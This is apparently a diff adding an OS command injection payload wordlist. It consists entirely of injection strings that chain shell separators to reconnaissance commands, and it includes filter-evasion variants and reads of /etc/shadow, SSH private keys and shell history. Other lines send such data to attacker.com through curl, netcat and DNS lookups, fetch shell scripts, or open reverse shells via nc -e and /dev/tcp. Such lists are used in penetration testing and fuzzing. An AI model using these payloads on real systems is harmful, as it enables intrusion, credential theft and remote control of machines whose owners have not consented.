@@ -1,0 +1,1846 @@
+
+; ls
+; id
+; pwd
+; whoami
+; uname -a
+; cat /etc/passwd
+; ifconfig
+; ipconfig
+; netstat -an
+; ps aux
+; wget
+; curl
+; ping -c 4 127.0.0.1
+; sleep 5
+; echo vulnerable
+| ls
+| id
+| pwd
+| whoami
+| uname -a
+| cat /etc/passwd
+| ifconfig
+| ipconfig
+| netstat -an
+| ps aux
+| wget
+| curl
+| ping -c 4 127.0.0.1
+| sleep 5
+| echo vulnerable
+|| ls
+|| id
+|| pwd
+|| whoami
+|| uname -a
+|| cat /etc/passwd
+|| ifconfig
+|| ipconfig
+|| netstat -an
+|| ps aux
+|| wget
+|| curl
+|| ping -c 4 127.0.0.1
+|| sleep 5
+|| echo vulnerable
+& ls
+& id
+& pwd
+& whoami
+& uname -a
+& cat /etc/passwd
+& ifconfig
+& ipconfig
+& netstat -an
+& ps aux
+& wget
+& curl
+& ping -c 4 127.0.0.1
+& sleep 5
+& echo vulnerable
+&& ls
+&& id
+&& pwd
+&& whoami
+&& uname -a
+&& cat /etc/passwd
+&& ifconfig
+&& ipconfig
+&& netstat -an
+&& ps aux
+&& wget
+&& curl
+&& ping -c 4 127.0.0.1
+&& sleep 5
+&& echo vulnerable
+` ls `
+` id `
+` pwd `
+` whoami `
+` uname -a `
+` cat /etc/passwd `
+` ifconfig `
+` ipconfig `
+` netstat -an `
+` ps aux `
+` wget `
+` curl `
+` ping -c 4 127.0.0.1 `
+` sleep 5 `
+` echo vulnerable `
+$( ls )
+$( id )
+$( pwd )
+$( whoami )
+$( uname -a )
+$( cat /etc/passwd )
+$( ifconfig )
+$( ipconfig )
+$( netstat -an )
+$( ps aux )
+$( wget )
+$( curl )
+$( ping -c 4 127.0.0.1 )
+$( sleep 5 )
+$( echo vulnerable )
+
+; cat /etc/passwd
+;cat /etc/passwd
+;  cat /etc/passwd
+;   cat /etc/passwd
+;    cat /etc/passwd
+| cat /etc/passwd
+|cat /etc/passwd
+|  cat /etc/passwd
+|   cat /etc/passwd
+|    cat /etc/passwd
+|| cat /etc/passwd
+||cat /etc/passwd
+||  cat /etc/passwd
+||   cat /etc/passwd
+||    cat /etc/passwd
+& cat /etc/passwd
+&cat /etc/passwd
+&  cat /etc/passwd
+&   cat /etc/passwd
+&    cat /etc/passwd
+&& cat /etc/passwd
+&&cat /etc/passwd
+&&  cat /etc/passwd
+&&   cat /etc/passwd
+&&    cat /etc/passwd
+%0a cat /etc/passwd
+%0d cat /etc/passwd
+%0a%0d cat /etc/passwd
+\n cat /etc/passwd
+\r cat /etc/passwd
+\r\n cat /etc/passwd
+; cat</etc/passwd
+| cat</etc/passwd
+; cat<>/etc/passwd
+| cat<>/etc/passwd
+; cat /e\tc/p\asswd
+| cat /e\tc/p\asswd
+; cat /etc/pass'w'd
+| cat /etc/pass'w'd
+; cat /etc/pass"w"d
+| cat /etc/pass"w"d
+; cat /etc/passw''d
+| cat /etc/passw''d
+; cat /etc/passw""d
+| cat /etc/passw""d
+; c'a't /etc/passwd
+| c'a't /etc/passwd
+; c"a"t /etc/passwd
+| c"a"t /etc/passwd
+; ca\t /etc/passwd
+| ca\t /etc/passwd
+; /bin/cat /etc/passwd
+| /bin/cat /etc/passwd
+; /usr/bin/cat /etc/passwd
+| /usr/bin/cat /etc/passwd
+; cat${IFS}/etc/passwd
+| cat${IFS}/etc/passwd
+; cat$IFS/etc/passwd
+| cat$IFS/etc/passwd
+; cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+| cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+; cat$IFS$9/etc/passwd
+| cat$IFS$9/etc/passwd
+; cat${IFS}${1}/etc/passwd
+| cat${IFS}${1}/etc/passwd
+; cat</etc/passwd;
+| cat</etc/passwd;
+; {cat,/etc/passwd}
+| {cat,/etc/passwd}
+; X=$'cat\x20/etc/passwd'&&$X
+| X=$'cat\x20/etc/passwd'&&$X
+; sh -c "cat /etc/passwd"
+| sh -c "cat /etc/passwd"
+; bash -c "cat /etc/passwd"
+| bash -c "cat /etc/passwd"
+; /bin/sh -c "cat /etc/passwd"
+| /bin/sh -c "cat /etc/passwd"
+; /bin/bash -c "cat /etc/passwd"
+| /bin/bash -c "cat /etc/passwd"
+; `cat /etc/passwd`
+| `cat /etc/passwd`
+; $(cat /etc/passwd)
+| $(cat /etc/passwd)
+; cat /etc/passwd #
+| cat /etc/passwd #
+; cat /etc/passwd;#
+| cat /etc/passwd;#
+; cat /etc/passwd //
+| cat /etc/passwd //
+; cat /etc/passwd;
+| cat /etc/passwd;
+; cat /etc/passwd|
+| cat /etc/passwd|
+; cat /etc/passwd||
+| cat /etc/passwd||
+; cat /etc/passwd&&
+| cat /etc/passwd&&
+; cat /etc/passwd&
+| cat /etc/passwd&
+%00; cat /etc/passwd
+%00| cat /etc/passwd
+%00|| cat /etc/passwd
+%00& cat /etc/passwd
+%00&& cat /etc/passwd
+; %00cat /etc/passwd
+| %00cat /etc/passwd
+; cat%00 /etc/passwd
+| cat%00 /etc/passwd
+; cat /etc/passwd%00
+| cat /etc/passwd%00
+;%20cat%20/etc/passwd
+|%20cat%20/etc/passwd
+;cat%20/etc/passwd
+|cat%20/etc/passwd
+%3bcat%20/etc/passwd
+%7ccat%20/etc/passwd
+; cat /etc/passwd%0a
+| cat /etc/passwd%0a
+; cat /etc/passwd%0d
+| cat /etc/passwd%0d
+; cat /etc/passwd\n
+| cat /etc/passwd\n
+; cat /etc/passwd\r
+| cat /etc/passwd\r
+;${IFS}cat${IFS}/etc/passwd
+|${IFS}cat${IFS}/etc/passwd
+;$IFS$9cat$IFS$9/etc/passwd
+|$IFS$9cat$IFS$9/etc/passwd
+; /???/??t /???/??ss??
+| /???/??t /???/??ss??
+; /???/c?t /???/p?ss??
+| /???/c?t /???/p?ss??
+; /b??/c?? /e??/p??s??
+| /b??/c?? /e??/p??s??
+; /b*/c* /e*/p*ss*
+| /b*/c* /e*/p*ss*
+; cat /e*c/p*ss*d
+| cat /e*c/p*ss*d
+; cat /*tc/p*sswd
+| cat /*tc/p*sswd
+; cat /*/*/passwd
+| cat /*/*/passwd
+; cat /*/*/*wd
+| cat /*/*/*wd
+%0acat%20/etc/passwd
+%0dcat%20/etc/passwd
+%0a%0dcat%20/etc/passwd
+\ncat /etc/passwd
+\rcat /etc/passwd
+\r\ncat /etc/passwd
+; cat</dev/null</etc/passwd
+| cat</dev/null</etc/passwd
+; (cat /etc/passwd)
+| (cat /etc/passwd)
+; { cat /etc/passwd; }
+| { cat /etc/passwd; }
+; [cat /etc/passwd]
+| [cat /etc/passwd]
+; cat /etc/passwd || id
+| cat /etc/passwd || id
+; cat /etc/passwd && id
+| cat /etc/passwd && id
+; cat /etc/passwd | id
+| cat /etc/passwd | id
+; cat /etc/passwd ; id
+| cat /etc/passwd ; id
+; cat /etc/passwd & id
+| cat /etc/passwd & id
+; a=c;b=at;$a$b /etc/passwd
+| a=c;b=at;$a$b /etc/passwd
+; echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | sh
+| echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | sh
+; perl -e 'system("cat /etc/passwd")'
+| perl -e 'system("cat /etc/passwd")'
+; python -c 'import os;os.system("cat /etc/passwd")'
+| python -c 'import os;os.system("cat /etc/passwd")'
+; ruby -e 'system("cat /etc/passwd")'
+| ruby -e 'system("cat /etc/passwd")'
+; php -r 'system("cat /etc/passwd");'
+| php -r 'system("cat /etc/passwd");'
+; awk 'BEGIN {system("cat /etc/passwd")}'
+| awk 'BEGIN {system("cat /etc/passwd")}'
+; cat$u /etc/passwd
+| cat$u /etc/passwd
+; cat$@ /etc/passwd
+| cat$@ /etc/passwd
+; cat$* /etc/passwd
+| cat$* /etc/passwd
+; cat${x} /etc/passwd
+| cat${x} /etc/passwd
+; cat${u} /etc/passwd
+| cat${u} /etc/passwd
+; cat${@} /etc/passwd
+| cat${@} /etc/passwd
+; cat${*} /etc/passwd
+| cat${*} /etc/passwd
+; c$@a$@t$@ /etc/passwd
+| c$@a$@t$@ /etc/passwd
+; ca$()t /etc/passwd
+| ca$()t /etc/passwd
+; ca${}t /etc/passwd
+| ca${}t /etc/passwd
+
+; curl http://attacker.com/?data=$(cat /etc/passwd)
+; wget http://attacker.com/?data=$(cat /etc/passwd)
+; curl http://attacker.com/?data=$(whoami)
+; wget http://attacker.com/?data=$(whoami)
+| curl http://attacker.com/?data=$(cat /etc/passwd)
+| wget http://attacker.com/?data=$(cat /etc/passwd)
+| curl http://attacker.com/?data=$(whoami)
+| wget http://attacker.com/?data=$(whoami)
+|| curl http://attacker.com/?data=$(cat /etc/passwd)
+|| wget http://attacker.com/?data=$(cat /etc/passwd)
+|| curl http://attacker.com/?data=$(whoami)
+|| wget http://attacker.com/?data=$(whoami)
+& curl http://attacker.com/?data=$(cat /etc/passwd)
+& wget http://attacker.com/?data=$(cat /etc/passwd)
+& curl http://attacker.com/?data=$(whoami)
+& wget http://attacker.com/?data=$(whoami)
+&& curl http://attacker.com/?data=$(cat /etc/passwd)
+&& wget http://attacker.com/?data=$(cat /etc/passwd)
+&& curl http://attacker.com/?data=$(whoami)
+&& wget http://attacker.com/?data=$(whoami)
+; cat /etc/passwd | curl -X POST -d @- http://attacker.com
+; cat /etc/shadow | curl -X POST -d @- http://attacker.com
+; cat /etc/hosts | curl -X POST -d @- http://attacker.com
+| cat /etc/passwd | curl -X POST -d @- http://attacker.com
+| cat /etc/shadow | curl -X POST -d @- http://attacker.com
+| cat /etc/hosts | curl -X POST -d @- http://attacker.com
+|| cat /etc/passwd | curl -X POST -d @- http://attacker.com
+|| cat /etc/shadow | curl -X POST -d @- http://attacker.com
+|| cat /etc/hosts | curl -X POST -d @- http://attacker.com
+& cat /etc/passwd | curl -X POST -d @- http://attacker.com
+& cat /etc/shadow | curl -X POST -d @- http://attacker.com
+& cat /etc/hosts | curl -X POST -d @- http://attacker.com
+&& cat /etc/passwd | curl -X POST -d @- http://attacker.com
+&& cat /etc/shadow | curl -X POST -d @- http://attacker.com
+&& cat /etc/hosts | curl -X POST -d @- http://attacker.com
+; env | curl -X POST -d @- http://attacker.com
+; printenv | curl -X POST -d @- http://attacker.com
+; set | curl -X POST -d @- http://attacker.com
+| env | curl -X POST -d @- http://attacker.com
+| printenv | curl -X POST -d @- http://attacker.com
+| set | curl -X POST -d @- http://attacker.com
+|| env | curl -X POST -d @- http://attacker.com
+|| printenv | curl -X POST -d @- http://attacker.com
+|| set | curl -X POST -d @- http://attacker.com
+& env | curl -X POST -d @- http://attacker.com
+& printenv | curl -X POST -d @- http://attacker.com
+& set | curl -X POST -d @- http://attacker.com
+&& env | curl -X POST -d @- http://attacker.com
+&& printenv | curl -X POST -d @- http://attacker.com
+&& set | curl -X POST -d @- http://attacker.com
+; cat /etc/passwd | nc attacker.com 4444
+; cat /etc/shadow | nc attacker.com 4444
+; whoami | nc attacker.com 4444
+; id | nc attacker.com 4444
+| cat /etc/passwd | nc attacker.com 4444
+| cat /etc/shadow | nc attacker.com 4444
+| whoami | nc attacker.com 4444
+| id | nc attacker.com 4444
+|| cat /etc/passwd | nc attacker.com 4444
+|| cat /etc/shadow | nc attacker.com 4444
+|| whoami | nc attacker.com 4444
+|| id | nc attacker.com 4444
+& cat /etc/passwd | nc attacker.com 4444
+& cat /etc/shadow | nc attacker.com 4444
+& whoami | nc attacker.com 4444
+& id | nc attacker.com 4444
+&& cat /etc/passwd | nc attacker.com 4444
+&& cat /etc/shadow | nc attacker.com 4444
+&& whoami | nc attacker.com 4444
+&& id | nc attacker.com 4444
+; cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com
+; cat /etc/shadow | base64 | curl -X POST -d @- http://attacker.com
+| cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com
+| cat /etc/shadow | base64 | curl -X POST -d @- http://attacker.com
+|| cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com
+|| cat /etc/shadow | base64 | curl -X POST -d @- http://attacker.com
+& cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com
+& cat /etc/shadow | base64 | curl -X POST -d @- http://attacker.com
+&& cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com
+&& cat /etc/shadow | base64 | curl -X POST -d @- http://attacker.com
+; nslookup $(whoami).attacker.com
+; nslookup $(cat /etc/hostname).attacker.com
+; dig $(whoami).attacker.com
+; dig $(cat /etc/hostname).attacker.com
+| nslookup $(whoami).attacker.com
+| nslookup $(cat /etc/hostname).attacker.com
+| dig $(whoami).attacker.com
+| dig $(cat /etc/hostname).attacker.com
+|| nslookup $(whoami).attacker.com
+|| nslookup $(cat /etc/hostname).attacker.com
+|| dig $(whoami).attacker.com
+|| dig $(cat /etc/hostname).attacker.com
+& nslookup $(whoami).attacker.com
+& nslookup $(cat /etc/hostname).attacker.com
+& dig $(whoami).attacker.com
+& dig $(cat /etc/hostname).attacker.com
+&& nslookup $(whoami).attacker.com
+&& nslookup $(cat /etc/hostname).attacker.com
+&& dig $(whoami).attacker.com
+&& dig $(cat /etc/hostname).attacker.com
+; ping -c 1 $(whoami).attacker.com
+; ping -c 1 $(hostname).attacker.com
+| ping -c 1 $(whoami).attacker.com
+| ping -c 1 $(hostname).attacker.com
+|| ping -c 1 $(whoami).attacker.com
+|| ping -c 1 $(hostname).attacker.com
+& ping -c 1 $(whoami).attacker.com
+& ping -c 1 $(hostname).attacker.com
+&& ping -c 1 $(whoami).attacker.com
+&& ping -c 1 $(hostname).attacker.com
+; tar czf - /etc/passwd | curl -X POST -d @- http://attacker.com
+; tar czf - /var/www | curl -X POST -d @- http://attacker.com
+| tar czf - /etc/passwd | curl -X POST -d @- http://attacker.com
+| tar czf - /var/www | curl -X POST -d @- http://attacker.com
+|| tar czf - /etc/passwd | curl -X POST -d @- http://attacker.com
+|| tar czf - /var/www | curl -X POST -d @- http://attacker.com
+& tar czf - /etc/passwd | curl -X POST -d @- http://attacker.com
+& tar czf - /var/www | curl -X POST -d @- http://attacker.com
+&& tar czf - /etc/passwd | curl -X POST -d @- http://attacker.com
+&& tar czf - /var/www | curl -X POST -d @- http://attacker.com
+; ls -la | curl -X POST -d @- http://attacker.com
+; ps aux | curl -X POST -d @- http://attacker.com
+; netstat -an | curl -X POST -d @- http://attacker.com
+| ls -la | curl -X POST -d @- http://attacker.com
+| ps aux | curl -X POST -d @- http://attacker.com
+| netstat -an | curl -X POST -d @- http://attacker.com
+|| ls -la | curl -X POST -d @- http://attacker.com
+|| ps aux | curl -X POST -d @- http://attacker.com
+|| netstat -an | curl -X POST -d @- http://attacker.com
+& ls -la | curl -X POST -d @- http://attacker.com
+& ps aux | curl -X POST -d @- http://attacker.com
+& netstat -an | curl -X POST -d @- http://attacker.com
+&& ls -la | curl -X POST -d @- http://attacker.com
+&& ps aux | curl -X POST -d @- http://attacker.com
+&& netstat -an | curl -X POST -d @- http://attacker.com
+; cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com
+; cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com
+; cat ~/.bash_history | curl -X POST -d @- http://attacker.com
+| cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com
+| cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com
+| cat ~/.bash_history | curl -X POST -d @- http://attacker.com
+|| cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com
+|| cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com
+|| cat ~/.bash_history | curl -X POST -d @- http://attacker.com
+& cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com
+& cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com
+& cat ~/.bash_history | curl -X POST -d @- http://attacker.com
+&& cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com
+&& cat ~/.ssh/authorized_keys | curl -X POST -d @- http://attacker.com
+&& cat ~/.bash_history | curl -X POST -d @- http://attacker.com
+
+; %6c%73
+; %69%64
+; %70%77%64
+; %77%68%6f%61%6d%69
+| %6c%73
+| %69%64
+| %70%77%64
+| %77%68%6f%61%6d%69
+|| %6c%73
+|| %69%64
+|| %70%77%64
+|| %77%68%6f%61%6d%69
+& %6c%73
+& %69%64
+& %70%77%64
+& %77%68%6f%61%6d%69
+&& %6c%73
+&& %69%64
+&& %70%77%64
+&& %77%68%6f%61%6d%69
+%3b ls
+%3b id
+%3b pwd
+%3b whoami
+%7c ls
+%7c id
+%7c pwd
+%7c whoami
+%7c%7c ls
+%7c%7c id
+%7c%7c pwd
+%7c%7c whoami
+%26 ls
+%26 id
+%26 pwd
+%26 whoami
+%26%26 ls
+%26%26 id
+%26%26 pwd
+%26%26 whoami
+%3b%20ls
+%3b%20id
+%3b%20pwd
+%3b%20whoami
+%7c%20ls
+%7c%20id
+%7c%20pwd
+%7c%20whoami
+%26%20ls
+%26%20id
+%26%20pwd
+%26%20whoami
+%0a ls
+%0a id
+%0a pwd
+%0a whoami
+%0d ls
+%0d id
+%0d pwd
+%0d whoami
+%0a%0d ls
+%0a%0d id
+%0a%0d pwd
+%0a%0d whoami
+\n ls
+\n id
+\n pwd
+\n whoami
+\r ls
+\r id
+\r pwd
+\r whoami
+\r\n ls
+\r\n id
+\r\n pwd
+\r\n whoami
+%0als
+%0aid
+%0apwd
+%0awhoami
+%0dls
+%0did
+%0dpwd
+%0dwhoami
+; c\at /etc/passwd
+; c\at /e\tc/p\asswd
+| c\at /etc/passwd
+| c\at /e\tc/p\asswd
+; cat</etc/passwd
+| cat</etc/passwd
+; cat${IFS}/etc/passwd
+| cat${IFS}/etc/passwd
+; cat$IFS/etc/passwd
+| cat$IFS/etc/passwd
+; cat /etc/pa\sswd
+| cat /etc/pa\sswd
+%3bcat%20/etc/passwd
+%7ccat%20/etc/passwd
+%26cat%20/etc/passwd
+; ls -la
+; id
+; pwd
+; whoami
+; uname -a
+; cat /etc/passwd
+; cat /etc/shadow
+; cat /etc/hosts
+; cat /etc/issue
+; cat /proc/version
+; ifconfig
+; ip addr
+; netstat -an
+; netstat -tunlp
+; ps aux
+; ps -ef
+; env
+; printenv
+; echo $PATH
+; echo $USER
+; echo $HOME
+| ls -la
+| id
+| pwd
+| whoami
+| uname -a
+| cat /etc/passwd
+| cat /etc/shadow
+| cat /etc/hosts
+| cat /etc/issue
+| cat /proc/version
+| ifconfig
+| ip addr
+| netstat -an
+| netstat -tunlp
+| ps aux
+| ps -ef
+| env
+| printenv
+| echo $PATH
+| echo $USER
+| echo $HOME
+|| ls -la
+|| id
+|| pwd
+|| whoami
+|| uname -a
+|| cat /etc/passwd
+|| cat /etc/shadow
+|| cat /etc/hosts
+|| cat /etc/issue
+|| cat /proc/version
+|| ifconfig
+|| ip addr
+|| netstat -an
+|| netstat -tunlp
+|| ps aux
+|| ps -ef
+|| env
+|| printenv
+|| echo $PATH
+|| echo $USER
+|| echo $HOME
+& ls -la
+& id
+& pwd
+& whoami
+& uname -a
+& cat /etc/passwd
+& cat /etc/shadow
+& cat /etc/hosts
+& cat /etc/issue
+& cat /proc/version
+& ifconfig
+& ip addr
+& netstat -an
+& netstat -tunlp
+& ps aux
+& ps -ef
+& env
+& printenv
+& echo $PATH
+& echo $USER
+& echo $HOME
+&& ls -la
+&& id
+&& pwd
+&& whoami
+&& uname -a
+&& cat /etc/passwd
+&& cat /etc/shadow
+&& cat /etc/hosts
+&& cat /etc/issue
+&& cat /proc/version
+&& ifconfig
+&& ip addr
+&& netstat -an
+&& netstat -tunlp
+&& ps aux
+&& ps -ef
+&& env
+&& printenv
+&& echo $PATH
+&& echo $USER
+&& echo $HOME
+; wget http://example.com/shell.sh
+; curl http://example.com/shell.sh
+; fetch http://example.com/shell.sh
+| wget http://example.com/shell.sh
+| curl http://example.com/shell.sh
+| fetch http://example.com/shell.sh
+|| wget http://example.com/shell.sh
+|| curl http://example.com/shell.sh
+|| fetch http://example.com/shell.sh
+& wget http://example.com/shell.sh
+& curl http://example.com/shell.sh
+& fetch http://example.com/shell.sh
+&& wget http://example.com/shell.sh
+&& curl http://example.com/shell.sh
+&& fetch http://example.com/shell.sh
+; nc -e /bin/sh 127.0.0.1 4444
+; nc -c /bin/sh 127.0.0.1 4444
+; ncat -e /bin/sh 127.0.0.1 4444
+| nc -e /bin/sh 127.0.0.1 4444
+| nc -c /bin/sh 127.0.0.1 4444
+| ncat -e /bin/sh 127.0.0.1 4444
+|| nc -e /bin/sh 127.0.0.1 4444
+|| nc -c /bin/sh 127.0.0.1 4444
+|| ncat -e /bin/sh 127.0.0.1 4444
+& nc -e /bin/sh 127.0.0.1 4444
+& nc -c /bin/sh 127.0.0.1 4444
+& ncat -e /bin/sh 127.0.0.1 4444
+&& nc -e /bin/sh 127.0.0.1 4444
+&& nc -c /bin/sh 127.0.0.1 4444
+&& ncat -e /bin/sh 127.0.0.1 4444
+; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+; sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
+| bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+| sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
+|| bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+|| sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
+& bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+& sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
+&& bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+&& sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
+; find / -name "*.conf"
+; find / -type f -perm -4000
+; find / -writable -type f
+| find / -name "*.conf"
+| find / -type f -perm -4000
+| find / -writable -type f
+|| find / -name "*.conf"
+|| find / -type f -perm -4000
+|| find / -writable -type f
+& find / -name "*.conf"
+& find / -type f -perm -4000
+& find / -writable -type f
+&& find / -name "*.conf"
+&& find / -type f -perm -4000
+&& find / -writable -type f
+; grep -r "password" /etc/
+; grep -r "root" /etc/
+; grep -r "admin" /etc/
+| grep -r "password" /etc/
+| grep -r "root" /etc/
+| grep -r "admin" /etc/
+|| grep -r "password" /etc/
+|| grep -r "root" /etc/
+|| grep -r "admin" /etc/
+& grep -r "password" /etc/
+& grep -r "root" /etc/
+& grep -r "admin" /etc/
+&& grep -r "password" /etc/
+&& grep -r "root" /etc/
+&& grep -r "admin" /etc/
+; df -h
+; mount
+; lsblk
+; fdisk -l
+| df -h
+| mount
+| lsblk
+| fdisk -l
+|| df -h
+|| mount
+|| lsblk
+|| fdisk -l
+& df -h
+& mount
+& lsblk
+& fdisk -l
+&& df -h
+&& mount
+&& lsblk
+&& fdisk -l
+; awk 'BEGIN {system("id")}'
+; perl -e 'system("id")'
+; python -c 'import os;os.system("id")'
+; ruby -e 'system("id")'
+; php -r 'system("id");'
+| awk 'BEGIN {system("id")}'
+| perl -e 'system("id")'
+| python -c 'import os;os.system("id")'
+| ruby -e 'system("id")'
+| php -r 'system("id");'
+|| awk 'BEGIN {system("id")}'
+|| perl -e 'system("id")'
+|| python -c 'import os;os.system("id")'
+|| ruby -e 'system("id")'
+|| php -r 'system("id");'
+& awk 'BEGIN {system("id")}'
+& perl -e 'system("id")'
+& python -c 'import os;os.system("id")'
+& ruby -e 'system("id")'
+& php -r 'system("id");'
+&& awk 'BEGIN {system("id")}'
+&& perl -e 'system("id")'
+&& python -c 'import os;os.system("id")'
+&& ruby -e 'system("id")'
+&& php -r 'system("id");'
+
+; l\s
+; i\d
+; p\wd
+; whoa\mi
+| l\s
+| i\d
+| p\wd
+| whoa\mi
+|| l\s
+|| i\d
+|| p\wd
+|| whoa\mi
+& l\s
+& i\d
+& p\wd
+& whoa\mi
+&& l\s
+&& i\d
+&& p\wd
+&& whoa\mi
+; /b\in/l\s
+; /b\in/i\d
+; /b\in/p\wd
+; /u\sr/b\in/whoa\mi
+| /b\in/l\s
+| /b\in/i\d
+| /b\in/p\wd
+| /u\sr/b\in/whoa\mi
+; cat${IFS}/etc/passwd
+; cat$IFS/etc/passwd
+; cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+| cat${IFS}/etc/passwd
+| cat$IFS/etc/passwd
+| cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+; cat</etc/passwd
+; cat<</etc/passwd
+| cat</etc/passwd
+| cat<</etc/passwd
+; {cat,/etc/passwd}
+; {ls,-la}
+| {cat,/etc/passwd}
+| {ls,-la}
+; cat /e''tc/pa''sswd
+; cat /e""tc/pa""sswd
+| cat /e''tc/pa''sswd
+| cat /e""tc/pa""sswd
+; w'h'o'a'm'i
+; w"h"o"a"m"i
+| w'h'o'a'm'i
+| w"h"o"a"m"i
+; echo${IFS}vulnerable
+; echo$IFS$9vulnerable
+| echo${IFS}vulnerable
+| echo$IFS$9vulnerable
+; ${PATH:0:1}bin${PATH:0:1}ls
+; ${PATH:~0:~1}bin${PATH:~0:~1}ls
+| ${PATH:0:1}bin${PATH:0:1}ls
+| ${PATH:~0:~1}bin${PATH:~0:~1}ls
+; l${x}s
+; i${x}d
+; p${x}wd
+; whoa${x}mi
+| l${x}s
+| i${x}d
+| p${x}wd
+| whoa${x}mi
+; ls -la $HOME
+; ls -la ~
+| ls -la $HOME
+| ls -la ~
+; cat /etc/issue
+; cat /etc/*release*
+| cat /etc/issue
+| cat /etc/*release*
+; l$@s
+; i$@d
+; p$@wd
+; whoa$@mi
+| l$@s
+| i$@d
+| p$@wd
+| whoa$@mi
+; ls${u}
+; id${u}
+; pwd${u}
+; whoami${u}
+| ls${u}
+| id${u}
+| pwd${u}
+| whoami${u}
+; who$()ami
+; who${}ami
+| who$()ami
+| who${}ami
+; /???/??/l?
+; /???/??/i?
+; /???/??/p??
+| /???/??/l?
+| /???/??/i?
+| /???/??/p??
+; /???/???/whoa??
+; /???/???/ls
+| /???/???/whoa??
+| /???/???/ls
+; echo vulnerable | sed 's/e/E/'
+; echo vulnerable | tr 'a-z' 'A-Z'
+| echo vulnerable | sed 's/e/E/'
+| echo vulnerable | tr 'a-z' 'A-Z'
+; $(echo ls)
+; $(echo id)
+; $(echo pwd)
+; $(echo whoami)
+| $(echo ls)
+| $(echo id)
+| $(echo pwd)
+| $(echo whoami)
+; `echo ls`
+; `echo id`
+; `echo pwd`
+; `echo whoami`
+| `echo ls`
+| `echo id`
+| `echo pwd`
+| `echo whoami`
+; ls;#
+; id;#
+; pwd;#
+; whoami;#
+| ls;#
+| id;#
+| pwd;#
+| whoami;#
+; a=l;b=s;$a$b
+; a=i;b=d;$a$b
+; a=p;b=wd;$a$b
+| a=l;b=s;$a$b
+| a=i;b=d;$a$b
+| a=p;b=wd;$a$b
+
+; curl http://attacker.com/$(whoami)
+; wget http://attacker.com/$(whoami)
+; curl http://attacker.com/$(hostname)
+; wget http://attacker.com/$(hostname)
+| curl http://attacker.com/$(whoami)
+| wget http://attacker.com/$(whoami)
+| curl http://attacker.com/$(hostname)
+| wget http://attacker.com/$(hostname)
+|| curl http://attacker.com/$(whoami)
+|| wget http://attacker.com/$(whoami)
+|| curl http://attacker.com/$(hostname)
+|| wget http://attacker.com/$(hostname)
+& curl http://attacker.com/$(whoami)
+& wget http://attacker.com/$(whoami)
+& curl http://attacker.com/$(hostname)
+& wget http://attacker.com/$(hostname)
+&& curl http://attacker.com/$(whoami)
+&& wget http://attacker.com/$(whoami)
+&& curl http://attacker.com/$(hostname)
+&& wget http://attacker.com/$(hostname)
+; nslookup $(whoami).attacker.com
+; nslookup $(hostname).attacker.com
+; nslookup $(id).attacker.com
+| nslookup $(whoami).attacker.com
+| nslookup $(hostname).attacker.com
+| nslookup $(id).attacker.com
+|| nslookup $(whoami).attacker.com
+|| nslookup $(hostname).attacker.com
+|| nslookup $(id).attacker.com
+& nslookup $(whoami).attacker.com
+& nslookup $(hostname).attacker.com
+& nslookup $(id).attacker.com
+&& nslookup $(whoami).attacker.com
+&& nslookup $(hostname).attacker.com
+&& nslookup $(id).attacker.com
+; dig $(whoami).attacker.com
+; dig $(hostname).attacker.com
+; dig $(id).attacker.com
+| dig $(whoami).attacker.com
+| dig $(hostname).attacker.com
+| dig $(id).attacker.com
+|| dig $(whoami).attacker.com
+|| dig $(hostname).attacker.com
+|| dig $(id).attacker.com
+& dig $(whoami).attacker.com
+& dig $(hostname).attacker.com
+& dig $(id).attacker.com
+&& dig $(whoami).attacker.com
+&& dig $(hostname).attacker.com
+&& dig $(id).attacker.com
+; host $(whoami).attacker.com
+; host $(hostname).attacker.com
+| host $(whoami).attacker.com
+| host $(hostname).attacker.com
+|| host $(whoami).attacker.com
+|| host $(hostname).attacker.com
+& host $(whoami).attacker.com
+& host $(hostname).attacker.com
+&& host $(whoami).attacker.com
+&& host $(hostname).attacker.com
+; ping -c 1 $(whoami).attacker.com
+; ping -c 1 $(hostname).attacker.com
+| ping -c 1 $(whoami).attacker.com
+| ping -c 1 $(hostname).attacker.com
+|| ping -c 1 $(whoami).attacker.com
+|| ping -c 1 $(hostname).attacker.com
+& ping -c 1 $(whoami).attacker.com
+& ping -c 1 $(hostname).attacker.com
+&& ping -c 1 $(whoami).attacker.com
+&& ping -c 1 $(hostname).attacker.com
+; ping -n 1 $(whoami).attacker.com
+; ping -n 1 $(hostname).attacker.com
+| ping -n 1 $(whoami).attacker.com
+| ping -n 1 $(hostname).attacker.com
+|| ping -n 1 $(whoami).attacker.com
+|| ping -n 1 $(hostname).attacker.com
+& ping -n 1 $(whoami).attacker.com
+& ping -n 1 $(hostname).attacker.com
+&& ping -n 1 $(whoami).attacker.com
+&& ping -n 1 $(hostname).attacker.com
+; curl http://attacker.com/?x=$(cat /etc/passwd | base64)
+; wget http://attacker.com/?x=$(cat /etc/passwd | base64)
+| curl http://attacker.com/?x=$(cat /etc/passwd | base64)
